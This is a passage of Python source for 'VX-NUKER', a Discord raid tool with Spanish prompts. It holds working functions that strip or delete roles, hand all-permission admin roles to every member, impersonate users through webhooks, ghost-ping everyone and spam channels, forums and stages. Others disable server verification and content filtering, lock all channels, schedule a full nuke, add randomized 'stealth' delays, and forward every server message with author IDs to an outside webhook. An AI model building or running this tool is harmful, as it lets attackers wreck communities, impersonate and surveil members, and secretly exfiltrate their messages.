    g = _get_guild(sid)
    if not g: return
    _section("QUITAR ROLES")
    if not _confirm("quitar todos los roles"): return log_info("canceled")
    fx_load("stripping", 22, .002)
    t = time.perf_counter(); ok=fail=0
    for m in g.members:
        if m.bot or m.id in NO_BAN_KICK_ID: continue
        removable = [r for r in m.roles if not r.is_default()]
        if not removable: continue
        try: await m.remove_roles(*removable); log_ok(f"{m.name}  -{len(removable)} roles"); ok += 1
        except: fail += 1
    _summary("Strip Roles", ok, fail, time.perf_counter()-t)

async def unban_all(sid):
    g = _get_guild(sid)
    if not g: return
    _section("DESBANEAR A TODOS"); fx_spin("fetching bans", .8)
    bans = [e async for e in g.bans()]; log_info(f"{len(bans)} bans")
    if not bans: return
    fx_load("unbanning", 20, .002)
    t = time.perf_counter()
    async def _u(e):
        try: await g.unban(e.user); log_ok(e.user.name); return True
        except: return False
    r = await asyncio.gather(*[_u(e) for e in bans])
    _summary("Unban All", r.count(True), r.count(False), time.perf_counter()-t)

async def deafen_all(sid):
    g = _get_guild(sid)
    if not g: return
    _section("ENSORDECER VOZ"); fx_load("deafening", 16, .002)
    t = time.perf_counter(); ok=fail=0
    for m in g.members:
        if m.voice and m.voice.channel and m.id not in NO_BAN_KICK_ID:
            try: await m.edit(deafen=True); log_ok(m.name); ok += 1
            except: fail += 1
    _summary("Deafen All", ok, fail, time.perf_counter()-t)

async def disconnect_all(sid):
    g = _get_guild(sid)
    if not g: return
    _section("SACAR DE VOZ")
    if not _confirm("desconectar a todos de voz"): return log_info("canceled")
    fx_load("disconnecting", 16, .002)
    t = time.perf_counter(); ok=fail=0
    for m in g.members:
        if m.voice and m.voice.channel and m.id not in NO_BAN_KICK_ID:
            try: await m.move_to(None); log_ok(m.name); ok += 1
            except: fail += 1
    _summary("Kick VC All", ok, fail, time.perf_counter()-t)

async def ghost_ping_all(sid):
    g = _get_guild(sid)
    if not g: return
    _section("GHOST PING")
    tc = [c for c in g.channels if isinstance(c, discord.TextChannel)]
    if not tc: return log_err("no hay canales de texto")
    chan = tc[0]; log_info(f"via #{chan.name}")
    fx_load("pinging", 18, .002)
    t = time.perf_counter(); ok=fail=0
    for m in g.members:
        if m.bot or m.id in NO_BAN_KICK_ID: continue
        try:
            msg = await chan.send(f"<@{m.id}>"); await msg.delete()
            log_ok(m.name); ok += 1
        except: fail += 1
    _summary("Ghost Ping", ok, fail, time.perf_counter()-t)

async def impersonate(sid):
    g = _get_guild(sid)
    if not g: return
    _section("SUPLANTAR")
    tid = _ask("ID del usuario objetivo")
    try: target = await g.fetch_member(int(tid))
    except: return log_err("miembro no encontrado")
    msg = _ask("mensaje a enviar")
    if not msg: return log_err("message required")
    cid_raw = _ask("ID del canal [Enter = todos]")
    if cid_raw:
        try:
            cs = g.get_channel(int(cid_raw))
            if not cs or not isinstance(cs, discord.TextChannel): return log_err("canal no encontrado o no es de texto")
            tc = [cs]
        except ValueError: return log_err("invalid channel ID")
    else:
        tc = [c for c in g.channels if isinstance(c, discord.TextChannel)]
    log_info(f"target  {target.display_name}  |  {len(tc)} channel(s)")
    fx_load("cloning", 18, .002)
    t = time.perf_counter(); ok=fail=0
    async with aiohttp.ClientSession() as session:
        for chan in tc:
            wh_obj = None
            try:
                wh_obj = await chan.create_webhook(name=target.display_name[:32])
                wh = discord.Webhook.from_url(wh_obj.url, session=session)
                await wh.send(content=msg, username=target.display_name[:80], avatar_url=str(target.display_avatar.url))
                await wh_obj.delete(); log_ok(f"#{chan.name}"); ok += 1
            except Exception as e:
                log_err(_vis(str(e))); fail += 1
                if wh_obj:
                    try: await wh_obj.delete()
                    except: pass
    _summary("Impersonate", ok, fail, time.perf_counter()-t)

async def create_channels(sid):
    g = _get_guild(sid)
    if not g: return
    _section("CREAR CANALES")
    try: num = int(_ask("cantidad"))
    except ValueError: return log_err("invalid")
    typ  = _ask("tipo [text/voz]").lower()
    name = _ask("nombre [Enter = pub]") or RAID_NAME
    if typ not in ('text','voice'): return log_err("tipo invalido")
    fx_load("spawning", 20, .002)
    t = time.perf_counter()
    r = await asyncio.gather(*[create_channel(g, typ, name) for _ in range(num)])
    _summary("Create Channels", sum(x is not None for x in r), sum(x is None for x in r), time.perf_counter()-t)

async def create_roles(sid):
    g = _get_guild(sid)
    if not g: return
    _section("CREAR ROLES")
    try: num = int(_ask("cantidad"))
    except ValueError: return log_err("invalid")
    name = _ask("nombre del rol [Enter = pub]") or "VX-NUKER"
    fx_load("generating", 18, .002)
    t = time.perf_counter()
    async def _cr():
        try:
            col = discord.Colour.from_rgb(random.randint(0,255), random.randint(0,255), random.randint(0,255))
            r = await g.create_role(name=name, colour=col); log_ok(f"@{r.name}"); return True
        except: return False
    r = await asyncio.gather(*[_cr() for _ in range(num)])
    _summary("Create Roles", r.count(True), r.count(False), time.perf_counter()-t)

async def get_admin(sid):
    g = _get_guild(sid)
    if not g: return
    _section("DAR ADMIN")
    log_info("Esta funcion crea un rol con TODOS los permisos de administrador")
    log_info("y lo asigna a los miembros que elijas")
    target = _ask("ID del usuario [Enter = asignar a TODOS]")
    fx_spin("creando rol admin", .8)
    try:
        col  = discord.Colour.red()
        role = await g.create_role(name="VX-NUKER ADMIN", colour=col, permissions=discord.Permissions.all())
        log_ok(f"rol @{role.name} creado con exito")
    except Exception as e: return log_err(f"error al crear rol: {_vis(str(e))}")
    t = time.perf_counter()
    if not target:
        log_info("Asignando rol admin a TODOS los miembros...")
        async def _a(m):
            if m.bot: return False
            try: await m.add_roles(role); log_ok(f"admin -> {m.name}"); return True
            except: return False
        results = await asyncio.gather(*[_a(m) for m in g.members])
        _summary("Get Admin (todos)", results.count(True), results.count(False), time.perf_counter()-t)
    else:
        try:
            m = await g.fetch_member(int(target))
            await m.add_roles(role)
            log_ok(f"admin asignado a {m.name}")
        except Exception as e: log_err(f"error: {_vis(str(e))}")

async def change_server(sid):
    g = _get_guild(sid)
    if not g: return
    _section("EDITAR SERVIDOR")
    name = _ask("nombre nuevo [Enter = pub]") or SERVER_CONFIG['new_name']
    icon = _ask("URL del icono [Enter = saltar]") or SERVER_CONFIG['new_icon']
    desc = _ask("descripcion [Enter = pub]") or SERVER_CONFIG['new_description']
    fx_spin("applying", .8)
    t = time.perf_counter(); ok=0
    try: await g.edit(name=name); log_ok("name"); ok += 1
    except Exception as e: log_err(f"name  {_vis(str(e))}")
    try: await g.edit(description=desc); log_ok("desc"); ok += 1
    except Exception as e: log_err(f"desc  {_vis(str(e))}")
    if icon:
        try:
            with urllib.request.urlopen(icon) as res: await g.edit(icon=res.read())
            log_ok("icon"); ok += 1
        except Exception as e: log_err(f"icon  {_vis(str(e))}")
    _summary("Edit Server", ok, 3-ok, time.perf_counter()-t)

async def rename_all_channels(sid):
    g = _get_guild(sid)
    if not g: return
    _section("RENOMBRAR CANALES"); name = _ask("nombre nuevo [Enter = pub]") or RAID_NAME
    fx_load("renaming", 20, .002)
    t = time.perf_counter(); ok=fail=0
    for i, ch in enumerate(g.channels):
        if isinstance(ch, (discord.TextChannel, discord.VoiceChannel, discord.CategoryChannel)):
            try: await ch.edit(name=f"{name}-{i+1}"); log_ok(f"{name}-{i+1}"); ok += 1
            except: fail += 1
    _summary("Rename Channels", ok, fail, time.perf_counter()-t)

async def rename_all_roles(sid):
    g = _get_guild(sid)
    if not g: return
    _section("RENOMBRAR ROLES"); name = _ask("nombre nuevo [Enter = pub]") or "VX-NUKER"
    fx_load("renaming", 18, .002)
    t = time.perf_counter(); ok=fail=0
    for i, r in enumerate([r for r in g.roles if not r.is_default()]):
        try: await r.edit(name=f"{name}-{i+1}"); log_ok(f"@{name}-{i+1}"); ok += 1
        except: fail += 1
    _summary("Rename Roles", ok, fail, time.perf_counter()-t)

async def category_creator(sid):
    g = _get_guild(sid)
    if not g: return
    _section("CREAR CATEGORIAS")
    try: count = int(_ask("cantidad"))
    except ValueError: return log_err("invalid")
    name = _ask("nombre [Enter = pub]") or "VX-NUKER"
    fx_load("creating", 16, .002)
    t = time.perf_counter(); ok=fail=0
    for i in range(count):
        try: await g.create_category(f"{name} {i+1}"); log_ok(f"{name} {i+1}"); ok += 1
        except: fail += 1
    _summary("Create Cats", ok, fail, time.perf_counter()-t)

async def dehoist_all(sid):
    g = _get_guild(sid)
    if not g: return
    _section("CORREGIR APODOS"); fx_load("processing", 16, .002)
    t = time.perf_counter(); ok=fail=0
    special = set("!\"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~")
    for m in g.members:
        if m.bot: continue
        n = m.display_name
        if n and n[0] in special:
            clean = n.lstrip("".join(special)) or "vx"
            try: await m.edit(nick=clean); log_ok(f"{n} -> {clean}"); ok += 1
            except: fail += 1
    if not ok: log_info("nada que corregir")
    _summary("Fix Nicks", ok, fail, time.perf_counter()-t)

async def clone_server(sid):
    g = _get_guild(sid)
    if not g: return
    _section("CLONAR SERVIDOR"); fx_spin("scanning", 1.0)
    t = time.perf_counter(); cats={}; chans=[]
    for ch in g.channels:
        if isinstance(ch, discord.CategoryChannel): cats[ch.id] = ch.name
        elif isinstance(ch, (discord.TextChannel, discord.VoiceChannel)):
            chans.append({"name":ch.name,"type":"text" if isinstance(ch,discord.TextChannel) else "voice","category":cats.get(ch.category_id)})
    path = f"clone_{g.id}.json"
    with open(path,"w",encoding="utf-8") as f:
        json.dump({"name":g.name,"channels":chans,"categories":list(cats.values())},f,indent=2)
    log_ok(f"saved  {path}")
    _summary("Clone Server", len(chans), 0, time.perf_counter()-t)

async def mass_move(sid):
    g = _get_guild(sid)
    if not g: return
    _section("MOVER TODOS VOZ")
    vcs = [c for c in g.channels if isinstance(c, discord.VoiceChannel)]
    if not vcs: return log_err("no hay canales de voz")
    for i, vc in enumerate(vcs): log_info(f"[{i+1}] #{vc.name}")
    try: target = vcs[int(_ask("target VC number"))-1]
    except: return log_err("invalid")
    fx_load("moving", 14, .002)
    t = time.perf_counter(); ok=fail=0
    for m in g.members:
        if m.voice and m.voice.channel:
            try: await m.move_to(target); log_ok(f"{m.name} -> #{target.name}"); ok += 1
            except: fail += 1
    _summary("Move All VC", ok, fail, time.perf_counter()-t)

async def lockdown(sid):
    g = _get_guild(sid)
    if not g: return
    _section("BLOQUEO TOTAL")
    if not _confirm(f"bloquear {g.name}"): return log_info("canceled")
    fx_load("locking", 20, .002)
    t = time.perf_counter(); ok=fail=0
    for ch in [c for c in g.channels if isinstance(c, discord.TextChannel)]:
        try: await ch.set_permissions(g.default_role, send_messages=False); log_ok(f"#{ch.name}"); ok += 1
        except: fail += 1
    _summary("Lockdown", ok, fail, time.perf_counter()-t)

async def server_info(sid):
    g = _get_guild(sid)
    if not g: return
    _section("INFO DEL SERVIDOR"); fx_spin("fetching", .7)
    bans = [e async for e in g.bans()]
    rows = [("name",g.name),("id",str(g.id)),("owner",str(g.owner)),("members",str(g.member_count)),
            ("bans",str(len(bans))),("channels",str(len(g.channels))),
            ("text",str(len([c for c in g.channels if isinstance(c,discord.TextChannel)]))),
            ("voice",str(len([c for c in g.channels if isinstance(c,discord.VoiceChannel)]))),
            ("roles",str(len(g.roles))),("emojis",str(len(g.emojis))),
            ("boosts",str(g.premium_subscription_count)),("created",g.created_at.strftime('%Y-%m-%d'))]
    print(); print(f"  {D2}{'─'*38}{RS}")
    for k,v in rows: print(f"  {DIM}{k:<14}{RS}  {R2}{v}{RS}")
    print(f"  {D2}{'─'*38}{RS}"); print()

_wh_logger_url:      str  = ""
_wh_logger_guild_id: int  = 0
_wh_logger_active:   bool = False

async def _dispatch_log(entry: str):
    if not _wh_logger_url: return
    try:
        payload = json.dumps({"content": entry[:1990], "username": "vx-logger"})
        async with aiohttp.ClientSession() as session:
            async with session.post(_wh_logger_url, data=payload,
                headers={"Content-Type":"application/json"},
                timeout=aiohttp.ClientTimeout(total=5)) as resp: pass
    except: pass

async def webhook_logger(sid):
    global _wh_logger_url, _wh_logger_guild_id, _wh_logger_active
    g = _get_guild(sid)
    if not g: return
    _section("LOGS POR WEBHOOK")
    url = _ask("URL del webhook de Discord")
    if "discord.com/api/webhooks/" not in url and "discordapp.com/api/webhooks/" not in url:
        return log_err("Invalid URL")
    _wh_logger_url = url; _wh_logger_guild_id = g.id; _wh_logger_active = True
    await _dispatch_log(f"\u2705 **VX-NUKER Logger active** on `{g.name}`")
    log_ok(f"logger active  ->  {url[:55]}..."); log_warn("sigue activo hasta salir")

async def webhook_logger_check(message: discord.Message):
    if not _wh_logger_active: return
    if not message.guild or message.guild.id != _wh_logger_guild_id: return
    if message.author.bot: return
    entry = (f"**#{message.channel.name}**  |  **{message.author}** (`{message.author.id}`)\n"
             f"```{(message.content or '[no text]')[:1700]}```")
    await _dispatch_log(entry)

async def _cancel_waiter():
    global _stop_flag
    _stop_flag = False
    log_warn("Presiona ENTER para detener el proceso en cualquier momento")
    await asyncio.get_event_loop().run_in_executor(None, lambda: input())
    _stop_flag = True
    log_info("Proceso detenido por el usuario")

async def purge_messages(sid):
    g = _get_guild(sid)
    if not g: return
    _section("PURGAR MENSAJES")
    mode = _ask("modo [all = todos | id = un canal]").lower()
    try: limit = int(_ask("mensajes por canal (max 1000)"))
    except ValueError: return log_err("invalid")
    limit = min(limit, 1000)
    if mode == "id":
        cid = _ask("ID del canal")
        try:
            ch = g.get_channel(int(cid))
            if not ch or not isinstance(ch, discord.TextChannel): return log_err("canal no encontrado")
            tc = [ch]
        except ValueError: return log_err("ID invalido")
    else:
        tc = [c for c in g.channels if isinstance(c, discord.TextChannel)]
    if not _confirm(f"purge {limit} msgs in {len(tc)} channel(s)"): return log_info("canceled")
    fx_load("purging", 20, .002)
    t = time.perf_counter(); ok=fail=0
    for chan in tc:
        try:
            deleted = await chan.purge(limit=limit)
            log_ok(f"#{chan.name}  {len(deleted)} msgs"); ok += len(deleted)
        except discord.Forbidden: log_err(f"sin permiso #{chan.name}"); fail += 1
        except discord.HTTPException as e: log_err(f"http{e.status} #{chan.name}"); fail += 1
    _summary("Purge Messages", ok, fail, time.perf_counter()-t)

async def export_logs(sid):
    _section("EXPORTAR LOGS")
    if not _LOGS:
        return log_info("no hay logs para exportar")
    path = os.path.join(os.path.dirname(os.path.abspath(__file__)), f"logs_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt")
    try:
        with open(path, "w", encoding="utf-8") as f:
            f.write(f"VX-NUKER Log Export - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"{'='*60}\n\n")
            for entry in _LOGS:
                f.write(f"{entry}\n")
        log_ok(f"exported {len(_LOGS)} entries -> {path}")
    except Exception as e:
        log_err(f"export failed: {_vis(str(e))}")

async def channel_slowmode(sid):
    g = _get_guild(sid)
    if not g: return
    _section("SLOWMODE")
    try: seconds = int(_ask("segundos de slowmode (0=off, max=21600)"))
    except ValueError: return log_err("invalid")
    seconds = max(0, min(seconds, 21600))
    if not _confirm(f"poner slowmode de {seconds}s en todos los canales"): return log_info("canceled")
    fx_load("applying slowmode", 20, .002)
    t = time.perf_counter(); ok=fail=0
    for ch in [c for c in g.channels if isinstance(c, discord.TextChannel)]:
        try: await ch.edit(slowmode_delay=seconds); log_ok(f"#{ch.name}  {seconds}s"); ok += 1
        except: fail += 1
    _summary("Slowmode", ok, fail, time.perf_counter()-t)

async def webhook_nuke(sid):
    g = _get_guild(sid)
    if not g: return
    _section("ELIMINAR WEBHOOKS")
    if not _confirm(f"eliminar TODOS los webhooks de {g.name}"): return log_info("canceled")
    fx_load("nuking webhooks", 20, .002)
    t = time.perf_counter(); ok=fail=0
    for ch in [c for c in g.channels if isinstance(c, discord.TextChannel)]:
        try:
            whs = await ch.webhooks()
            for wh in whs:
                try: await wh.delete(); log_ok(f"wh {wh.name} in #{ch.name}"); ok += 1
                except: fail += 1
        except: pass
    _summary("Webhook Nuke", ok, fail, time.perf_counter()-t)

async def role_all(sid):
    g = _get_guild(sid)
    if not g: return
    _section("ROL PARA TODOS")
    rid = _ask("ID del rol [Enter = crear rol admin nuevo]")
    if rid:
        try: role = g.get_role(int(rid))
        except: return log_err("ID de rol invalido")
        if not role: return log_err("rol no encontrado")
    else:
        try:
            role = await g.create_role(name="VX-NUKER", colour=discord.Colour.red(), permissions=discord.Permissions.all())
            log_ok(f"created @{role.name}")
        except Exception as e: return log_err(f"create role failed: {_vis(str(e))}")
    fx_load("assigning", 20, .002)
    t = time.perf_counter(); ok=fail=0
    for m in g.members:
        if m.bot: continue
        try: await m.add_roles(role); log_ok(m.name); ok += 1
        except: fail += 1
    _summary("Role All", ok, fail, time.perf_counter()-t)

async def channel_topic_spam(sid):
    g = _get_guild(sid)
    if not g: return
    _section("SPAM DE TOPICS")
    topic = _ask("topic nuevo [Enter = pub]") or PUB_SHORT
    fx_load("setting topics", 18, .002)
    t = time.perf_counter(); ok=fail=0
    for ch in [c for c in g.channels if isinstance(c, discord.TextChannel)]:
        try: await ch.edit(topic=topic[:1024]); log_ok(f"#{ch.name}"); ok += 1
        except: fail += 1
    _summary("Topic Spam", ok, fail, time.perf_counter()-t)

async def permission_override(sid):
    g = _get_guild(sid)
    if not g: return
    _section("SOBREESCRIBIR PERMISOS")
    log_info("modes: deny_send | deny_view | deny_all | allow_all")
    mode = _ask("mode").lower()
    modes = {
        "deny_send": {"send_messages": False},
        "deny_view": {"view_channel": False},
        "deny_all":  {"send_messages": False, "view_channel": False, "connect": False},
        "allow_all": {"send_messages": True, "view_channel": True, "connect": True},
    }
    if mode not in modes: return log_err("invalid mode")
    if not _confirm(f"aplicar '{mode}' a @everyone en todos los canales"): return log_info("canceled")
    fx_load("overriding", 20, .002)
    t = time.perf_counter(); ok=fail=0
    overwrite = discord.PermissionOverwrite(**modes[mode])
    for ch in g.channels:
        try: await ch.set_permissions(g.default_role, overwrite=overwrite); log_ok(f"#{ch.name}"); ok += 1
        except: fail += 1
    _summary("Permission Override", ok, fail, time.perf_counter()-t)

async def steal_emojis(sid):
    g = _get_guild(sid)
    if not g: return
    _section("ROBAR EMOJIS")
    target_id = _ask("ID del servidor a robarle emojis")
    try: target = bot.get_guild(int(target_id))
    except: return log_err("ID invalido")
    if not target: return log_err("el bot no esta en el servidor objetivo")
    emojis = list(target.emojis)
    if not emojis: return log_info("target has no emojis")
    log_info(f"{len(emojis)} emojis found in {target.name}")
    if not _confirm(f"copy {len(emojis)} emojis to {g.name}"): return log_info("canceled")
    fx_load("stealing", 18, .002)
    t = time.perf_counter(); ok=fail=0
    async with aiohttp.ClientSession() as session:
        for emoji in emojis:
            try:
                async with session.get(str(emoji.url)) as resp:
                    if resp.status == 200:
                        data = await resp.read()
                        await g.create_custom_emoji(name=emoji.name, image=data)
                        log_ok(f":{emoji.name}:"); ok += 1
                    else: fail += 1
            except: fail += 1
    _summary("Steal Emojis", ok, fail, time.perf_counter()-t)

async def prune_members(sid):
    g = _get_guild(sid)
    if not g: return
    _section("EXPULSAR INACTIVOS")
    try: days = int(_ask("dias inactivo (1-30)"))
    except ValueError: return log_err("invalid")
    days = max(1, min(days, 30))
    estimate = await g.estimate_pruned_members(days=days)
    log_info(f"estimated prune: {estimate} members")
    if not _confirm(f"prune {estimate} inactive members ({days} days)"): return log_info("canceled")
    fx_load("pruning", 18, .002)
    t = time.perf_counter()
    try:
        pruned = await g.prune_members(days=days, reason="VX-NUKER prune")
        log_ok(f"pruned {pruned} members")
        _summary("Prune", pruned or 0, 0, time.perf_counter()-t)
    except Exception as e:
        log_err(_vis(str(e)))
        _summary("Prune", 0, 1, time.perf_counter()-t)

async def quit_tool():
    _clr()
    print(f"\n  {R1}{B}VX-NUKER  |  goodbye  |  {PUB_SHORT}{RS}\n")
    await bot.close()

async def change_server_target(sid):
    global server_id, guild, acts, bot_token
    _clr()
    _print_banner(bot.user.name, guild.name, guild.member_count)
    _section("CAMBIAR SERVIDOR")
    new_sid = _ask("ID del nuevo servidor")
    new_guild = bot.get_guild(int(new_sid)) if new_sid.isdigit() else None
    if not new_guild:
        log_err("el bot no esta en ese servidor o ID invalido")
    else:
        server_id = new_sid
        guild = new_guild
        acts = _actions(server_id, bot.user.id)
        _save_session(bot_token, server_id)
        log_ok(f"cambiado a {guild.name} ({guild.member_count} miembros)")

_raid_profile = {"name": "default", "msg": "", "channels": 50, "msgs_per_chan": 10}

async def raid_presets(sid):
    g = _get_guild(sid)
    if not g: return
    _section("PRESETS DE RAID")
    log_info("Guarda o carga configuraciones de raid")
    opt = _ask("opcion [save/load/list]").lower()
    if opt == "save":
        name = _ask("nombre del preset") or "default"
        profile = {
            "name": name,
            "msg": _ask("mensaje [Enter = pub]") or PUB,
            "channels": int(_ask("canales a crear") or 50),
            "msgs": int(_ask("mensajes por canal") or 10)
        }
        path = f"preset_{name}.json"
        with open(path, "w") as f:
            json.dump(profile, f, indent=2)
        log_ok(f"preset guardado: {path}")
    elif opt == "load":
        name = _ask("nombre del preset") or "default"
        path = f"preset_{name}.json"
        try:
            with open(path) as f:
                p = json.load(f)
            global _raid_profile
            _raid_profile = p
            log_ok(f"preset cargado: {name}")
        except: log_err("preset no encontrado")
    elif opt == "list":
        import glob
        for f in glob.glob("preset_*.json"):
            log_info(f)

async def scheduled_raid(sid):
    g = _get_guild(sid)
    if not g: return
    _section("RAID PROGRAMADO")
    try:
        mins = int(_ask("minutos para ejecutar"))
        if mins < 1: return log_err("minimo 1 minuto")
        log_warn(f"RAID PROGRAMADO en {mins} minuto(s)")
        log_info("Presiona ENTER para cancelar")
        for i in range(mins * 60, 0, -1):
            global _stop_flag
            if _stop_flag: log_info("cancelado"); return
            if i % 10 == 0 or i <= 5:
                print(f"\r  {R2}[!]{RS} {WHT}{i} segundos restantes...{RS}    ", end="", flush=True)
            await asyncio.sleep(1)
        print()
        log_ok("EJECUTANDO RAID PROGRAMADO")
        await nuke(sid)
    except ValueError: log_err("numero invalido")

async def stealth_toggle(sid):
    global _STEALTH_MODE, _STEALTH_DELAY
    _section("MODO SIGILO")
    _STEALTH_MODE = not _STEALTH_MODE
    if _STEALTH_MODE:
        try:
            mn = float(_ask("delay minimo (segundos) [0.5]") or 0.5)
            mx = float(_ask("delay maximo (segundos) [1.5]") or 1.5)
            _STEALTH_DELAY = (mn, mx)
        except: _STEALTH_DELAY = (0.5, 1.5)
        log_ok(f"MODO SIGILO ACTIVADO  delay: {_STEALTH_DELAY[0]}-{_STEALTH_DELAY[1]}s")
    else:
        log_ok("MODO SIGILO DESACTIVADO")

async def _ssleep():
    if _STEALTH_MODE:
        await asyncio.sleep(random.uniform(*_STEALTH_DELAY))

async def server_nuke(sid):
    g = _get_guild(sid)
    if not g: return
    _section("NUKEAR SERVIDOR")
    log_warn("Cambia toda la configuracion de seguridad del servidor")
    if not _confirm("nukear configuracion del servidor"): return
    t = time.perf_counter(); ok = 0
    try:
        await g.edit(verification_level=discord.VerificationLevel.none,
                     explicit_content_filter=discord.ContentFilter.disabled,
                     default_notifications=discord.NotificationLevel.all_messages)
        log_ok("verificacion: none | filtro: disabled | notis: todos"); ok += 1
    except: log_err("no permiso para cambiar config")
    try:
        await g.edit(syschannel=None)
        log_ok("canal de sistema eliminado"); ok += 1
    except: pass
    try:
        await g.edit(afk_channel=None)
        log_ok("canal AFK eliminado"); ok += 1
    except: pass
    try:
        await g.edit(community=False)
        log_ok("comunidad desactivada"); ok += 1
    except: pass
    _summary("Server Nuke", ok, 0, time.perf_counter()-t)

async def forum_spam(sid):
    g = _get_guild(sid)
    if not g: return
    _section("SPAM DE FOROS")
    try: count = int(_ask("foros a crear"))
    except: return log_err("cantidad invalida")
    name = _ask("nombre [Enter = pub]") or RAID_NAME
    topic = _ask("tema del foro") or PUB_SHORT
    t = time.perf_counter(); ok = 0
    for i in range(count):
        try:
            chan = await g.create_text_channel(f"{name}-{i+1}", type=discord.ChannelType.forum)
            log_ok(f"foro #{chan.name}"); ok += 1
            await _ssleep()
        except: log_err(f"error creando foro {i+1}")
    _summary("Forum Spam", ok, count-ok, time.perf_counter()-t)

async def stage_spam(sid):
    g = _get_guild(sid)
    if not g: return
    _section("SPAM DE STAGES")
    try: count = int(_ask("stages a crear"))
    except: return log_err("cantidad invalida")
    name = _ask("nombre [Enter = pub]") or RAID_NAME
    t = time.perf_counter(); ok = 0
    for i in range(count):
        try:
            chan = await g.create_stage_channel(f"{name}-{i+1}")
            log_ok(f"stage #{chan.name}"); ok += 1
            await _ssleep()
        except: log_err(f"error creando stage {i+1}")
    _summary("Stage Spam", ok, count-ok, time.perf_counter()-t)

async def restore_server(sid):
    g = _get_guild(sid)
    if not g: return
    _section("RESTAURAR SERVIDOR")
    import glob
    clones = glob.glob("clone_*.json")
    if not clones: return log_err("no hay backups (usa Clone Server primero)")
    for i, c in enumerate(clones): log_info(f"[{i+1}] {c}")
    try:
        idx = int(_ask("numero del backup")) - 1
        path = clones[idx]
    except: return log_err("seleccion invalida")
    with open(path) as f: data = json.load(f)
    if not _confirm(f"restaurar {data['name']} ({len(data['channels'])} canales)"): return
    t = time.perf_counter(); ok = 0
    cats = {}
    for cname in data.get("categories", []):
        try:
            cat = await g.create_category(cname)
            cats[cname] = cat; ok += 1
            log_ok(f"categoria {cname}")
        except: log_err(f"error creando categoria {cname}")
    for ch in data.get("channels", []):
        try:
            cat = cats.get(ch.get("category")) if ch.get("category") else None
            if ch["type"] == "text":
                await g.create_text_channel(ch["name"], category=cat)
            else:
                await g.create_voice_channel(ch["name"], category=cat)
            log_ok(f"canal {ch['name']}"); ok += 1
        except: log_err(f"error creando {ch['name']}")
    _summary("Restore Server", ok, 0, time.perf_counter()-t)

async def perms_nuke(sid):
    g = _get_guild(sid)
    if not g: return
    _section("NUKEAR PERMISOS")
    if not _confirm("bloquear TODOS los canales para @everyone"): return
    t = time.perf_counter(); ok = 0
    for ch in g.channels:
        try:
            await ch.set_permissions(g.default_role, view_channel=False, connect=False)
            log_ok(f"bloqueado #{ch.name}"); ok += 1
            await _ssleep()
        except: log_err(f"error #{ch.name}")
    _summary("Perms Nuke", ok, 0, time.perf_counter()-t)

async def icon_rotate(sid):
    g = _get_guild(sid)
    if not g: return
    _section("ROTAR ICONO")
    url = _ask("URL de la imagen [Enter = usar tu icono]") or "https://files.catbox.moe/wgke8n.png"
    try: count = int(_ask("veces a cambiar"))
    except: return log_err("numero invalido")
    t = time.perf_counter(); ok = 0
    async with aiohttp.ClientSession() as session:
        for i in range(count):
            try:
                async with session.get(url) as resp:
                    if resp.status == 200:
                        data = await resp.read()
                        await g.edit(icon=data)
                        log_ok(f"cambio {i+1}/{count}"); ok += 1
            except: log_err(f"error cambio {i+1}")
            await asyncio.sleep(2)
    _summary("Icon Rotate", ok, count-ok, time.perf_counter()-t)

async def stats_view(sid):
    g = _get_guild(sid)
    if not g: return
    _section("ESTADISTICAS")
    bans = [e async for e in g.bans()]
    online = sum(1 for m in g.members if m.status != discord.Status.offline) if hasattr(g, 'members') else 0
    rows = [
        ("servidor", g.name), ("ID", str(g.id)), ("dueño", str(g.owner)),
        ("miembros", str(g.member_count)), ("online", str(online)),
        ("baneos", str(len(bans))), ("canales", str(len(g.channels))),
        ("roles", str(len(g.roles))), ("emojis", str(len(g.emojis))),
        ("stages", str(len([c for c in g.channels if isinstance(c, discord.StageChannel)]))),
        ("foros", str(len([c for c in g.channels if isinstance(c, discord.TextChannel) and c.type == discord.ChannelType.forum]))),
        ("boost", str(g.premium_subscription_count)),
        ("nivel", str(g.premium_tier)), ("creado", g.created_at.strftime('%Y-%m-%d')),
    ]
    print(f"  {D2}{'─'*38}{RS}")
    for k, v in rows:
        print(f"  {DIM}{k:<14}{RS}  {R2}{v}{RS}")
    print(f"  {D2}{'─'*38}{RS}")

async def delete_all_roles(sid):
    g = _get_guild(sid)
    if not g: return
    _section("ELIMINAR ROLES")
    if not _confirm("eliminar TODOS los roles"): return
    t = time.perf_counter()
    roles = [r for r in g.roles if not r.is_default() and r < g.me.top_role]
    log_info(f"{len(roles)} roles removibles")
    r = await asyncio.gather(*[delete_role(r) for r in roles])
    _summary("Del Roles", r.count(True), r.count(False), time.perf_counter()-t)

async def delete_categories(sid):
    g = _get_guild(sid)
    if not g: return
    _section("ELIMINAR CATEGORIAS")
    cats = [c for c in g.channels if isinstance(c, discord.CategoryChannel)]
    if not cats: return log_err("no hay categorias")
    t = time.perf_counter(); ok = 0
    for cat in cats:
        try:
            for ch in cat.channels:
                try: await ch.delete()
                except: pass
            await cat.delete(); log_ok(f"categoria {cat.name}"); ok += 1
        except: log_err(f"error {cat.name}")
        await _ssleep()
    _summary("Del Cats", ok, len(cats)-ok, time.perf_counter()-t)

async def rename_categories(sid):
    g = _get_guild(sid)
    if not g: return
    _section("RENOMBRAR CATEGORIAS")
    name = _ask("nombre nuevo [Enter = pub]") or RAID_NAME
    cats = [c for c in g.channels if isinstance(c, discord.CategoryChannel)]
    t = time.perf_counter(); ok = 0
    for i, cat in enumerate(cats):
        try: await cat.edit(name=f"{name}-{i+1}"); log_ok(f"{name}-{i+1}"); ok += 1
        except: log_err(f"error {cat.name}")
        await _ssleep()
    _summary("Rename Cats", ok, len(cats)-ok, time.perf_counter()-t)

async def clone_roles(sid):
    g = _get_guild(sid)
    if not g: return
    _section("CLONAR ROLES")
    target_id = _ask("ID del servidor a clonar roles")
    try: target = bot.get_guild(int(target_id))
    except: return log_err("ID invalido")
    if not target: return log_err("bot no esta en ese servidor")
    roles = [r for r in target.roles if not r.is_default() and r.name != "@everyone"]
    log_info(f"{len(roles)} roles a clonar")
    if not _confirm("clonar roles"): return
    t = time.perf_counter(); ok = 0
    for r in roles:
        try:
            await g.create_role(name=r.name, permissions=r.permissions, colour=r.colour, hoist=r.hoist, mentionable=r.mentionable)
            log_ok(f"rol {r.name}"); ok += 1
        except: log_err(f"error {r.name}")
        await _ssleep()
    _summary("Clone Roles", ok, len(roles)-ok, time.perf_counter()-t)

